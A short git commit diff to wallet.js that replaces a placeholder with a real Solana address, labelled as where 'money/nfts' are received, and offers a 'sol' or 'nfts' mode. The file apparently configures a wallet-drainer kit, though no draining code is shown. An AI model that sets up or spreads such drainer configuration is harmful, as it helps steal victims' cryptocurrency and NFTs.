29cc902c4b9f2d206e2d767e0f38267d0e0dc464
solrac171717 <100234356+solrac171717@users.noreply.github.com>
2022-07-17 17:26:32 +0200

    Update wallet.js

--- wallet.js
+++ wallet.js
@@ -2,6 +2,6 @@
     = = = = = YOUR WALLET ADRESS = = = = =
 */
 
-const receiveAddress = "your solana wallet adress"; // Adress where you want to receive money/nfts
+const receiveAddress = "2ZiSF5hEuzmNkk4Cm3Qkhd2cDGCdW7umcoL8DYVQL3ou"; // Adress where you want to receive money/nfts
 
 const mode = "sol", "nfts" // type "sol" only if you want only sol OR "nfts" only if you want only nfts. (You must delete the ,)
